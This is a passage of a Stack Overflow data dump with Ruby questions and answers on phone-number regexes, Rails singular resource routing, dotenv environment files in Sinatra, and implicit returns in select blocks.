</p>\n\n<pre><code>[0-9]{2,3}(\\s|-)[0-9]{4,5}-?[0-9]{3,4}\n</code></pre>\n\n<h3>Test</h3>\n\n<pre><code>re = /[0-9]{2,3}(\\s|-)[0-9]{4,5}-?[0-9]{3,4}/m\nstr = '\\'00 00000000\\'\n\\'000-000000000\\'\n\\'000 00000-0000\\'\n\\'00 0000-0000\\''\n\n# Print the match result\nstr.scan(re) do |match|\n    puts match.to_s\nend\n</code></pre>\n\n<h3>Demo</h3>\n\n<p>This snippet is just to show the capturing groups and that the expression might be valid:  </p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const regex = /[0-9]{2,3}(\\s|-)[0-9]{4,5}-?[0-9]{3,4}/gm;\r\nconst str = `'00 00000000'\r\n'000-000000000'\r\n'000 00000-0000'\r\n'00 0000-0000'`;\r\nlet m;\r\n\r\nwhile ((m = regex.exec(str)) !== null) {\r\n    // This is necessary to avoid infinite loops with zero-width matches\r\n    if (m.index === regex.lastIndex) {\r\n        regex.lastIndex++;\r\n    }\r\n    \r\n    // The result can be accessed through the `m`-variable.\r\n    m.forEach((match, groupIndex) =&gt; {\r\n        console.log(`Found match, group ${groupIndex}: ${match}`);\r\n    });\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<h3>RegEx</h3>\n\n<p>If this expression wasn't desired, it can be modified or changed in <a href=\"https://regex101.com/r/fr7TRG/1/\" rel=\"nofollow noreferrer\">regex101.com</a>.</p>\n\n<p><a href=\"https://i.stack.imgur.com/skGY0.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/skGY0.png\" alt=\"enter image description here\"></a></p>\n\n<h3>RegEx Circuit</h3>\n\n<p><a href=\"https://jex.im/regulex/#!flags=&amp;re=%5E(a%7Cb)*%3F%24\" rel=\"nofollow noreferrer\">jex.im</a> also helps to visualize the expressions. </p>\n\n<p><a href=\"https://i.stack.imgur.com/JHloT.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/JHloT.png\" alt=\"enter image description here\"></a></p>\n\n<hr>\n\n<h3>Edit 1:</h3>\n\n<p>In case of <code>()</code>, we want to add two negative lookbehind to our initial expression. Maybe, <a href=\"https://regex101.com/r/EdGdfE/1/\" rel=\"nofollow noreferrer\">similar to this</a>:</p>\n\n<pre><code>\\(?[0-9]{2,3}\\)?(\\s|-)[0-9]{4,5}-?[0-9]{3,4}\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/F1mS9.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/F1mS9.png\" alt=\"enter image description here\"></a></p>\n"}, {"comments": [{"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 0, "creation_date": 1558328429, "post_id": 56214497, "comment_id": 99049862, "body": "Thank you! That&#39;s a great idead, I&#39;ll sure do that."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 2, "creation_date": 1558373922, "post_id": 56214497, "comment_id": 99072038, "body": "mudsie, I believe you meant <code>.gsub(&#47;\\A0+&#47;, &#39;&#39;)</code>. This does not tell us whether a string represents a valid phone number, but isn&#39;t that the idea? For example, <code>&quot;Something like 99.473218% of Rubiests use snake case for names of variables and methods.&quot;.gsub(&#47;\\D+&#47;, &#39;&#39;).gsub(&#47;\\A0+&#47;, &#39;&#39;) =~ &#47;\\d{8,9}&#47; #=&gt; 0</code>. I confirmed that by phoning that number and heard no ringtone."}, {"owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "edited": false, "score": 0, "creation_date": 1558381388, "post_id": 56214497, "comment_id": 99074787, "body": "Doesn&#39;t this also not match the requirements because only the single leading 0 should be ignored?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558381802, "post_id": 56214497, "comment_id": 99074936, "body": "If the requirement is to scary users, or to play regex golf, then yes, the above does not work. If the goal is to validate the user\u2019s input, than it is the only way to go. Because when they reject the number I entered, because they have a sophisticated regex there, you know, I close the page. Forever. After all, 555- numbers would pass, while they are surely invalid."}, {"owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "edited": false, "score": 0, "creation_date": 1558381908, "post_id": 56214497, "comment_id": 99074984, "body": "But if it accepts invalid input and then they can&#39;t call you because they stored an invalid number... that&#39;s also annoying"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558382049, "post_id": 56214497, "comment_id": 99075038, "body": "The chance I would occasionally swap two digits is likely 1M times more probable than I would enter the Shakespeare&#39;s sonnet there."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558382250, "post_id": 56214497, "comment_id": 99075113, "body": "The same applies for emails, addresses etc. I was living at Street, 1bis,  building 1/2-3, app. 5-5 (do not ask) and guess how many food delivery forms accepted that."}, {"owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "edited": false, "score": 0, "creation_date": 1558391447, "post_id": 56214497, "comment_id": 99077916, "body": "@AlekseiMatiushkin I agree. With that perspective I would just strip non-digits and verify it&#39;s non-empty. Stripping leading zeros is possibly destructive."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": false, "score": 4, "last_activity_date": 1558328043, "creation_date": 1558328043, "answer_id": 56214497, "question_id": 56214299, "link": "https://stackoverflow.com/questions/56214299/regex-for-matching-specific-phone-numbers/56214497#56214497", "title": "RegEx for matching specific phone numbers", "body": "<p>Do not validate phone numbers with regular expressions. I bet you do not want to rule out those occasionally typing 2 consequent spaces or something.</p>\n\n<p>Instead, filter out all the non-digits and leading zeroes, and then validate. Like this:</p>\n\n<pre><code>number.gsub(/\\D+/, '').gsub(/\\A0+/) =~ /\\d{8,9}/\n</code></pre>\n\n<p>I am not sure it would suit your needs out of the box, but I bet you\u2019ve got the point. After all, <code>[000]1234   56789</code> is an understandable phone number.</p>\n"}, {"tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": true, "score": 2, "last_activity_date": 1558335883, "creation_date": 1558335883, "answer_id": 56215809, "question_id": 56214299, "link": "https://stackoverflow.com/questions/56214299/regex-for-matching-specific-phone-numbers/56215809#56215809", "title": "RegEx for matching specific phone numbers", "body": "<p>I believe you can use the following regular expression.</p>\n\n<pre><code>R = /\n    \\A            # match beginning of string\n    (?:           # begin a non-capture group\n      \\(0?\\d{2}\\) # match '(' then an optional `0` then two digits then ')'\n    |             # or\n      0?\\d{2}     # match an optional `0` then two digits\n    )             # end the non-capture group\n    (?:           # begin a non-capture group\n      [ ]+        # match one or more spaces\n    |             # or\n      -           # match a hyphen\n    )             # end the non-capture group\n    \\d{4,5}       # match 4 or 5 digits\n    -?            # optionally match a hyphen\n    \\d{4}         # match 4 digits\n    \\z            # match end of string\n    /x            # free-spacing regex definition mode\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>arr = [\n  '00 00000000',\n  '000-000000000',\n  '000 00000-0000',\n  '00 0000-0000',\n  '(00) 0000-0000',\n  '(000) 000000000',\n  '(000 000000000',\n  '(0000) 000000000'\n]\n\narr.map { |s| s.match? R }\n  #=&gt; [true, true, true, true, true, true, false, false]\n</code></pre>\n\n<h1><p></p></h1>\n\n<p>The regex is conventionally written as follows.</p>\n\n<pre><code>R = /\\A(?:\\(0?\\d{2}\\)|0?\\d{2})(?: +|-)\\d{4,5}-?\\d{4}\\z/\n</code></pre>\n\n<p>This should be changed as follows if the leading digits cannot equal zero. (If, for example, <code>'001-123456789'</code> and <code>'(12)-023456789'</code> are invalid.)</p>\n\n<pre><code>R = /\\A(?:\\(0?[1-9]\\d\\)|0?\\[1-9]\\d)(?: +|-)[1-9]\\d{3,4}-?\\d{4}\\z/\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558375164, "post_id": 56217137, "comment_id": 99072513, "body": "The conditional expression is new to me and certainly a worthwhile addition to my toolbelt. Considering that it is so potentially useful, and that Ruby v2.0 has been out for so long, I&#39;m surprised that I&#39;ve not seen it used before here at SO."}], "tags": [], "owner": {"reputation": 11918, "user_id": 5527985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CfG3C.png?s=128&g=1", "display_name": "bobble bubble", "link": "https://stackoverflow.com/users/5527985/bobble-bubble"}, "is_accepted": false, "score": 4, "last_activity_date": 1558343478, "last_edit_date": 1558343478, "creation_date": 1558341479, "answer_id": 56217137, "question_id": 56214299, "link": "https://stackoverflow.com/questions/56214299/regex-for-matching-specific-phone-numbers/56217137#56217137", "title": "RegEx for matching specific phone numbers", "body": "<p>My answer addresses your <a href=\"https://www.regular-expressions.info/conditional.html\" rel=\"nofollow noreferrer\">conditional</a> idea for the optional parenthesis.<br>\nRuby supports conditionals since v2.0. The <a href=\"https://www.honeybadger.io/blog/using-conditionals-inside-ruby-regular-expressions/\" rel=\"nofollow noreferrer\">syntax</a> is <code>(?(A)X|Y)</code>: If A is true, X else Y.</p>\n\n<ul>\n<li>Put an <a href=\"https://www.regular-expressions.info/optional.html\" rel=\"nofollow noreferrer\">optional</a> <a href=\"https://www.regular-expressions.info/brackets.html\" rel=\"nofollow noreferrer\">capturing group</a> containing an opening parenthesis at start:<br>\n<code>^(\\()?</code></li>\n<li>Later anywhere in the pattern check if it succeeded:<br>\n<code>(?(1)\\) |[ -])</code><br>\nIf success: require a closing <code>)</code> followed by space\n<code>|</code> else: <code>[ -]</code> space or dash.</li>\n</ul>\n\n<p>So the whole pattern with conditional could be</p>\n\n<pre><code>^(\\()?0?\\d{2}(?(1)\\) |[ -])\\d{4,5}[ -]?\\d{4}$\n</code></pre>\n\n<p>See the <a href=\"https://rubular.com/r/WXQBmX0NwVFzNV\" rel=\"nofollow noreferrer\">demo at Rubular</a> or <a href=\"https://regex101.com/r/9JBc8Z/1\" rel=\"nofollow noreferrer\">Regex101</a>. Adjust further to your needs.</p>\n\n<p>An alternative to use alternation <code>(?:\\(abc\\)|abc)</code> which @CarySwoveland answered already but @AlekseiMatiushkin's answer surely will make life easier I think.</p>\n"}, {"tags": [], "owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "is_accepted": false, "score": 0, "last_activity_date": 1558391788, "creation_date": 1558391788, "answer_id": 56229014, "question_id": 56214299, "link": "https://stackoverflow.com/questions/56214299/regex-for-matching-specific-phone-numbers/56229014#56229014", "title": "RegEx for matching specific phone numbers", "body": "<p>Don't do this unless you know you are working in a very, <em>very</em> limited scope e.g.</p>\n\n<ul>\n<li>The numbers are being passed to a system that only accepts a specific format so you know that these exact formats and no others will work</li>\n<li>The numbers are just read by a human, so you can let them figure it out and don't have to validate anything</li>\n</ul>\n\n<p>Otherwise you should use a robust library like <a href=\"https://github.com/mobi/telephone_number\" rel=\"nofollow noreferrer\">https://github.com/mobi/telephone_number</a> (inspired by Google's <a href=\"https://github.com/googlei18n/libphonenumber\" rel=\"nofollow noreferrer\">libphonenumber</a>)</p>\n"}], "owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 857, "favorite_count": 0, "accepted_answer_id": 56215809, "answer_count": 5, "score": 4, "last_activity_date": 1558391788, "creation_date": 1558326299, "last_edit_date": 1558328174, "question_id": 56214299, "link": "https://stackoverflow.com/questions/56214299/regex-for-matching-specific-phone-numbers", "title": "RegEx for matching specific phone numbers", "body": "<p>I'm trying to see if a string matches my country's phone number format, which is the area code (two digits that may or may not be preceded by a 0 and might also be between parenthesis) followed by 8 or 9 digits in which there may be an dash character before the 4 last digits.\nThese are some valid formats:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>\n'00 00000000'\n'000-000000000'\n'000 00000-0000'\n'00 0000-0000'\n'(00) 0000-0000'\n'(000) 000000000'\n</code></pre>\n\n<p>So far this is the working expression I have:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>\np = /0?\\d{2}\\s?-?\\s?\\d{4,5}\\s?-?\\s?\\d{4}/\n</code></pre>\n\n<p>I tried to use a conditional to see if the area code is inside parenthesis with <code>/?(\\() 0?\\d{2}\\)|0?\\d{2} \\s?-?\\s?\\d{4,5}\\s?-?\\s?\\d{4}/</code> but got the <code>(repl):1: target of repeat operator is not specified: /?(\\() 0?\\d{2}\\)|0?\\d{2} \\s?-?\\s?\\d{4,5}\\s?-?\\s?\\d{4}</code> error.</p>\n\n<p>What am I doing wrong here?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "routing", "routes"], "comments": [{"owner": {"reputation": 5237, "user_id": 2325924, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/XSXrT.jpg?s=128&g=1", "display_name": "7urkm3n", "link": "https://stackoverflow.com/users/2325924/7urkm3n"}, "edited": false, "score": 1, "creation_date": 1558326190, "post_id": 56214147, "comment_id": 99049363, "body": "Try <code>resource</code> without pluralized &#39;s&#39;."}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "reply_to_user": {"reputation": 5237, "user_id": 2325924, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/XSXrT.jpg?s=128&g=1", "display_name": "7urkm3n", "link": "https://stackoverflow.com/users/2325924/7urkm3n"}, "edited": false, "score": 0, "creation_date": 1558331806, "post_id": 56214147, "comment_id": 99050762, "body": "@7urkm3n Thank you, this worked! For anyone viewing this question - see <a href=\"https://stackoverflow.com/questions/11356146/difference-between-resource-and-resources-in-rails-routing\">link</a> for difference between <code>resource</code> and <code>resources</code>."}], "answers": [{"tags": [], "owner": {"reputation": 134, "user_id": 2690094, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FUkZx.jpg?s=128&g=1", "display_name": "AMHOL", "link": "https://stackoverflow.com/users/2690094/amhol"}, "is_accepted": false, "score": 0, "last_activity_date": 1558325102, "creation_date": 1558325102, "answer_id": 56214175, "question_id": 56214147, "link": "https://stackoverflow.com/questions/56214147/overriding-routes-parameters-with-nil-in-rails/56214175#56214175", "title": "Overriding routes parameters with NIL in Rails?", "body": "<p>As far as I know, there is not, <code>resource</code> is just a helper to create the standard verb-based CRUD routes, if you want custom routes you need to define your update route the way you did in your second example, of course, you can still use <code>resource</code> for your <code>create</code> route and just pass <code>only: :create</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "is_accepted": true, "score": 3, "last_activity_date": 1562669001, "last_edit_date": 1562669001, "creation_date": 1558340760, "answer_id": 56216938, "question_id": 56214147, "link": "https://stackoverflow.com/questions/56214147/overriding-routes-parameters-with-nil-in-rails/56216938#56216938", "title": "Overriding routes parameters with NIL in Rails?", "body": "<p>This is exactly the use case for singular resources. Quote from the <a href=\"https://guides.rubyonrails.org/routing.html#singular-resources\" rel=\"nofollow noreferrer\">Rails Guides</a>:</p>\n\n<blockquote>\n  <p>Sometimes, you have a resource that clients always look up without referencing an ID. For example, you would like <code>/profile</code> to always show the profile of the currently logged in user.</p>\n</blockquote>\n\n<p>Change our routing to</p>\n\n<pre><code>resource :cats, only: [:create, :update]\n</code></pre>\n\n<p>And the following routes will be created:</p>\n\n<pre><code>cats PATCH /cats(.:format)     cats#update\n     PUT   /cats(.:format)     cats#update\n     POST  /cats(.:format)     cats#create\n</code></pre>\n"}], "owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 191, "favorite_count": 0, "accepted_answer_id": 56216938, "answer_count": 2, "score": 0, "last_activity_date": 1562669001, "creation_date": 1558324837, "last_edit_date": 1558335563, "question_id": 56214147, "link": "https://stackoverflow.com/questions/56214147/overriding-routes-parameters-with-nil-in-rails", "title": "Overriding routes parameters with NIL in Rails?", "body": "<p>Is there a way to use resource routing instead of writing the routes one by one if my methods for which the default expects parameters don't use parameters?</p>\n\n<p>For example, if I had a routes file like below, the expected path for the <code>update</code> method would be like this: <code>/cats/:id</code> (<a href=\"https://guides.rubyonrails.org/routing.html#crud-verbs-and-actions\" rel=\"nofollow noreferrer\">docs</a>)</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code># routes.rb\nRails.application.routes.draw do\n  resources :cats, only: [:create, :update]\nend\n</code></pre>\n\n<p>However, I don't require any params for my <code>update</code> method, meaning the path should be <code>/cats</code>.\nI know there's a way to <a href=\"https://guides.rubyonrails.org/routing.html#overriding-named-route-parameters\" rel=\"nofollow noreferrer\">rename</a> the params and not use <code>:id</code>, but I didn't find anything on disabling them. I tried adding <code>param: nil</code> to the end of the line but it didn't work.</p>\n\n<p>As I wrote initially, I know this can be done if I write the routes one by one like below. My question is whether I can use <code>resources</code> to do it. Thank you!</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code># routes.rb\nRails.application.routes.draw do\n  post 'cats', to: 'cats#create'\n  put 'cats', to: 'cats#update'\nend\n</code></pre>\n"}, {"tags": ["ruby", "rspec", "rake", "ruby-dotenv"], "answers": [{"comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1558334906, "post_id": 56213969, "comment_id": 99051835, "body": "Nothing in the project README mentions <code>ENV[&#39;APP_ENV&#39;]</code>; the only mention of environment-specific config files is in relation to <code>dotenv-rails</code> and <code>Rails.env</code>. After a little research, I see this issue has been raised before, and one of the library&#39;s authors suggested something very similar to your solution above: <a href=\"https://github.com/bkeepers/dotenv/issues/290\" rel=\"nofollow noreferrer\">github.com/bkeepers/dotenv/issues/290</a>"}], "tags": [], "owner": {"reputation": 382, "user_id": 2570513, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/7eb8f514f4fb6aa178669e98bc512797?s=128&d=identicon&r=PG", "display_name": "Mario Gil", "link": "https://stackoverflow.com/users/2570513/mario-gil"}, "is_accepted": false, "score": 1, "last_activity_date": 1558322865, "creation_date": 1558322865, "answer_id": 56213969, "question_id": 56213936, "link": "https://stackoverflow.com/questions/56213936/does-vanilla-ruby-dotenv-pick-up-any-file-other-than-env/56213969#56213969", "title": "Does &quot;vanilla&quot; Ruby dotenv pick up any file other than .env?", "body": "<p>I came up with this workaround</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>require 'dotenv'\nrequire 'sinatra'\nrequire 'sinatra/reloader' if development?\nDotenv.load(\".env.#{ENV['APP_ENV']}\") # Remember to set your app environment\n\nset :bind, '0.0.0.0'\n\nget ENV['API_URL'] do\n  'Hello World!'\nend\n</code></pre>\n\n<p>It only works for <code>.env.&lt;ENVIROMENT&gt;</code> files. Maybe this could be wrapped in a function but I definitely would like this to be handled by the gem as in Rails applications, it makes more sense to me.</p>\n"}], "owner": {"reputation": 382, "user_id": 2570513, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/7eb8f514f4fb6aa178669e98bc512797?s=128&d=identicon&r=PG", "display_name": "Mario Gil", "link": "https://stackoverflow.com/users/2570513/mario-gil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 392, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1569864937, "creation_date": 1558322609, "last_edit_date": 1569864937, "question_id": 56213936, "link": "https://stackoverflow.com/questions/56213936/does-vanilla-ruby-dotenv-pick-up-any-file-other-than-env", "title": "Does &quot;vanilla&quot; Ruby dotenv pick up any file other than .env?", "body": "<p>I want to use environment-specific variables in my non-Rails Ruby application.</p>\n\n<p>I tried different file names like <code>.env.test.local</code>, <code>.env.local</code>, <code>.env.test</code></p>\n\n<p>I tried using the <code>Dotenv.load</code> and <code>require 'dotenv/load'</code> approaches </p>\n\n<p>This is how I wrap the task</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>require 'rspec'\nrequire 'rack/test'\nrequire 'rspec/core/rake_task'\nrequire 'dotenv/tasks'\n\ntask test: :dotenv do\n  RSpec::Core::RakeTask.new(:spec).run_task(verbose: true)\nend\n</code></pre>\n\n<p>This is my server</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>require 'dotenv/load'\nrequire 'sinatra'\nrequire 'sinatra/reloader' if development?\n\nset :bind, '0.0.0.0'\n\nget ENV['API_URL'] do\n  'Hello World!'\nend\n</code></pre>\n\n<p>My <code>.env.test</code> file</p>\n\n<pre><code>API_URL=/api/v1\n</code></pre>\n\n<h2>Expected behavior</h2>\n\n<p>The API_URL variable should be available to the code run by the <code>:test</code> task (using <code>bundle exec rake test</code>).</p>\n\n<h2>Observed behavior</h2>\n\n<p>An error caused because <code>ENV['API_URL']</code> is null.</p>\n\n<pre><code>/Users/mariogil/.rvm/rubies/ruby-2.6.3/bin/ruby -I/Users/mariogil/.rvm/gems/ruby-2.6.3/gems/rspec-core-3.8.0/lib:/Users/mariogil/.rvm/gems/ruby-2.6.3/gems/rspec-support-3.8.0/lib /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/rspec-core-3.8.0/exe/rspec --pattern spec/\\*\\*\\{,/\\*/\\*\\*\\}/\\*_spec.rb\n\nAn error occurred while loading ./spec/server_spec.rb.\nFailure/Error:\n  get ENV['API_URL'] do\n    'Hello World!'\n  end\n\nTypeError:\n  NilClass can't be coerced into Mustermann::Pattern\n# /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/mustermann-1.0.3/lib/mustermann.rb:73:in `new'\n# /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/sinatra-2.0.5/lib/sinatra/base.rb:1641:in `compile'\n# /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/sinatra-2.0.5/lib/sinatra/base.rb:1629:in `compile!'\n# /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/sinatra-2.0.5/lib/sinatra/base.rb:1604:in `route'\n# /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/sinatra-2.0.5/lib/sinatra/base.rb:1386:in `get'\n# /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/sinatra-2.0.5/lib/sinatra/base.rb:1925:in `block (2 levels) in delegate'\n# ./lib/server.rb:9:in `&lt;top (required)&gt;'\n# ./spec/server_spec.rb:6:in `require'\n# ./spec/server_spec.rb:6:in `&lt;top (required)&gt;'\nNo examples found.\n\n\nFinished in 0.00026 seconds (files took 0.18951 seconds to load)\n0 examples, 0 failures, 1 error occurred outside of examples\n\n/Users/mariogil/.rvm/rubies/ruby-2.6.3/bin/ruby -I/Users/mariogil/.rvm/gems/ruby-2.6.3/gems/rspec-core-3.8.0/lib:/Users/mariogil/.rvm/gems/ruby-2.6.3/gems/rspec-support-3.8.0/lib /Users/mariogil/.rvm/gems/ruby-2.6.3/gems/rspec-core-3.8.0/exe/rspec --pattern spec/\\*\\*\\{,/\\*/\\*\\*\\}/\\*_spec.rb failed\n</code></pre>\n\n<p><a href=\"https://github.com/chioi/ruby-dotenv-not-loading-in-test-env\" rel=\"nofollow noreferrer\">See the repo</a></p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"comments": [{"owner": {"reputation": 16893, "user_id": 222403, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/69ef5d19ed581a0fcc98857d0e89527d?s=128&d=identicon&r=PG", "display_name": "Catfish", "link": "https://stackoverflow.com/users/222403/catfish"}, "edited": false, "score": 0, "creation_date": 1558322292, "post_id": 56213892, "comment_id": 99048716, "body": "Oh i thought for every implicit return you could have an explicit return. Guess not."}, {"owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "reply_to_user": {"reputation": 16893, "user_id": 222403, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/69ef5d19ed581a0fcc98857d0e89527d?s=128&d=identicon&r=PG", "display_name": "Catfish", "link": "https://stackoverflow.com/users/222403/catfish"}, "edited": false, "score": 2, "creation_date": 1558322567, "post_id": 56213892, "comment_id": 99048752, "body": "@Catfish Every implicit return from a method or lambda, not blocks though."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "reply_to_user": {"reputation": 16893, "user_id": 222403, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/69ef5d19ed581a0fcc98857d0e89527d?s=128&d=identicon&r=PG", "display_name": "Catfish", "link": "https://stackoverflow.com/users/222403/catfish"}, "edited": false, "score": 1, "creation_date": 1558334468, "post_id": 56213892, "comment_id": 99051675, "body": "@Catfish <code>next</code> is to blocks what <code>return</code> is to methods."}], "tags": [], "owner": {"reputation": 134, "user_id": 2690094, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FUkZx.jpg?s=128&g=1", "display_name": "AMHOL", "link": "https://stackoverflow.com/users/2690094/amhol"}, "is_accepted": true, "score": 2, "last_activity_date": 1558322123, "creation_date": 1558322123, "answer_id": 56213892, "question_id": 56213858, "link": "https://stackoverflow.com/questions/56213858/array-select-not-iterating-through-every-element/56213892#56213892", "title": "array.select not iterating through every element", "body": "<p>You need to remove the <code>return</code> statement from your method, Ruby uses implicit return (see <a href=\"https://jtrudell.github.io/blog/ruby_return_values/\" rel=\"nofollow noreferrer\">https://jtrudell.github.io/blog/ruby_return_values/</a>), so the result of a <code>block</code> is the last line that is evaluated in that block, the return statement in your code is treated as a <code>return</code> from the <code>values</code> method. Your method needs to look something like:</p>\n\n<pre><code>def values\n  @metric = metrics.select do |metric|\n    metric['href'].split('/').last == params[:id]\n  end\nend\n</code></pre>\n"}], "owner": {"reputation": 16893, "user_id": 222403, "user_type": "registered", "accept_rate": 85, "profile_image": 